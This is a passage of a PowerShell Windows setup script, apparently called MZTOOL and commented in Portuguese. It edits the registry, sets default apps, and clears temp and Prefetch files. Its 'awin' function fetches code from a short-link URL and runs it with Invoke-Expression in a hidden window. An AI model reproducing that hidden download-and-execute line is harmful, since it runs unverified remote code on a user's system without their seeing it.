    foreach ($setting in $settings) {
        $registry = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($setting.Name, $true)
        if ($null -eq $registry) {
            $registry = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($setting.Name, $true)
        }
        $setting.Group | ForEach-Object {
            if (!$_.Type) {
                $registry.SetValue($_.name, $_.value)
            }
            else {
                $registry.SetValue($_.name, $_.value, $_.type)
            }
        }
        $registry.Dispose()
    }
    
    #Remover ícone do Microsoft CoPilot da barra de tarefas.
    $settings = [PSCustomObject]@{
        Path  = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
        Value = 0
        Name  = 'ShowCopilotButton'
    } | Group-Object Path

    foreach ($setting in $settings) {
        $registry = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($setting.Name, $true)
        if ($null -eq $registry) {
            $registry = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($setting.Name, $true)
        }
        $setting.Group | ForEach-Object {
            if (!$_.Type) {
                $registry.SetValue($_.name, $_.value)
            }
            else {
                $registry.SetValue($_.name, $_.value, $_.type)
            }
        }
        $registry.Dispose()
    }
    
    $TRAYICONS = 'C:\TOOL\MZTOOL\REG\TRAYICONS.REG'

    Start-Process Reg.exe -ArgumentList "Import $TRAYICONS" -Wait
    
    Stop-Process -Name 'explorer'

    #Mostra e atualiza a Área de Trabalho.
    
    for ($i = 0; $i -le 2; $i++) {
        (New-Object -ComObject shell.application).toggleDesktop()
        Start-Sleep 2
        (New-Object -ComObject Wscript.Shell).sendkeys('{F5}')
        Start-Sleep 1
        (New-Object -ComObject shell.application).undominimizeall()
    }   

}
function DefaultSoftwares {

    $Host.UI.RawUI.WindowTitle = 'MZTOOL> PERFILTHEME > DEFAULTSOFTWARES'
    $Host.UI.RawUI.BackgroundColor = 'DarkBlue'
    
    #Definir Google Chrome como navegador padrão, e Acrobat Reader como leitor de PDF padrão.

    $associations_xml = @'
<?xml version="1.0" encoding="UTF-8"?>
<DefaultAssociations>
  <Association Identifier=".htm" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
  <Association Identifier=".html" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
  <Association Identifier=".pdf" ProgId="AcroExch.Document.DC" ApplicationName="Adobe Acrobat Reader" />
  <Association Identifier="http" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
  <Association Identifier="https" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
</DefaultAssociations>
'@

    $prov = New-Item "$($env:ProgramData)\provisioning" -ItemType Directory -Force

    $associations_xml | Out-File "$($prov.FullName)\associations.xml" -Encoding utf8

    dism /online /Import-DefaultAppAssociations:"$($prov.FullName)\associations.xml"

    #Desabilitar primeira inicialização do Microsoft Edge.
    
    $settings = 
    [PSCustomObject]@{
        Path  = 'SOFTWARE\Policies\Microsoft\Edge'
        Value = 1
        Name  = 'HideFirstRunExperience'
    } | Group-Object Path

    foreach ($setting in $settings) {
        $registry = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($setting.Name, $true)
        if ($null -eq $registry) {
            $registry = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($setting.Name, $true)
        }
        $setting.Group | ForEach-Object {
            $registry.SetValue($_.name, $_.value)
        }
        $registry.Dispose()
    }

    #Definir Google Chrome como navegador padrão.

    [System.IO.FileInfo]$DefaultAssociationsConfiguration = "$($env:ProgramData)\provisioning\DefaultAssociationsConfiguration.xml"

    if (!$DefaultAssociationsConfiguration.Directory.Exists) {
        $DefaultAssociationsConfiguration.Directory.Create()
    }

    '<?xml version="1.0" encoding="UTF-8"?>
<DefaultAssociations>
  <Association Identifier=".htm" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
  <Association Identifier=".html" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
  <Association Identifier="http" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
  <Association Identifier="https" ProgId="ChromeHTML" ApplicationName="Google Chrome" />
</DefaultAssociations>' | Out-File $DefaultAssociationsConfiguration.FullName -Encoding utf8 -Force

    $settings = 
    [PSCustomObject]@{
        Path  = 'SOFTWARE\Policies\Microsoft\Windows\System'
        Value = $DefaultAssociationsConfiguration.FullName
        Name  = 'DefaultAssociationsConfiguration'
    } | Group-Object Path

    foreach ($setting in $settings) {
        $registry = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($setting.Name, $true)
        if ($null -eq $registry) {
            $registry = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($setting.Name, $true)
        }
        $setting.Group | ForEach-Object {
            $registry.SetValue($_.name, $_.value)
        }
        $registry.Dispose()
    }

    #Desabilitar notificações do Google Chrome.

    $settings = 
    [PSCustomObject]@{
        Path  = 'SOFTWARE\Policies\Google\Chrome'
        Value = 2
        Name  = 'DefaultNotificationsSetting'
    } | Group-Object Path

    foreach ($setting in $settings) {
        $registry = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($setting.Name, $true)
        if ($null -eq $registry) {
            $registry = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($setting.Name, $true)
        }
        $setting.Group | ForEach-Object {
            $registry.SetValue($_.name, $_.value)
        }
        $registry.Dispose()
    }

    #Mostra e atualiza a Área de Trabalho.
    
    for ($i = 0; $i -le 2; $i++) {
        (New-Object -ComObject shell.application).toggleDesktop()
        Start-Sleep 2
        (New-Object -ComObject Wscript.Shell).sendkeys('{F5}')
        Start-Sleep 1
        (New-Object -ComObject shell.application).undominimizeall()
    }
}

function DelTemp {

    #Remover arquivos temporários.

    Remove-Item -Path $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue 

    Remove-Item -Path $env:C:\Windows\temp\* -Recurse -Force -ErrorAction SilentlyContinue

    Remove-Item -Path $env:C:\Windows\Prefetch\* -Recurse -Force -ErrorAction SilentlyContinue

    Write-Host 'LIMPANDO ARQUIVOS TEMPORÁRIOS'

    Start-Sleep 1     
}

function awin {
    Start-Process powershell -WindowStyle Hidden { Invoke-RestMethod https://4br.me/awin | Invoke-Expression }
}

DisplayMenu 

EXIT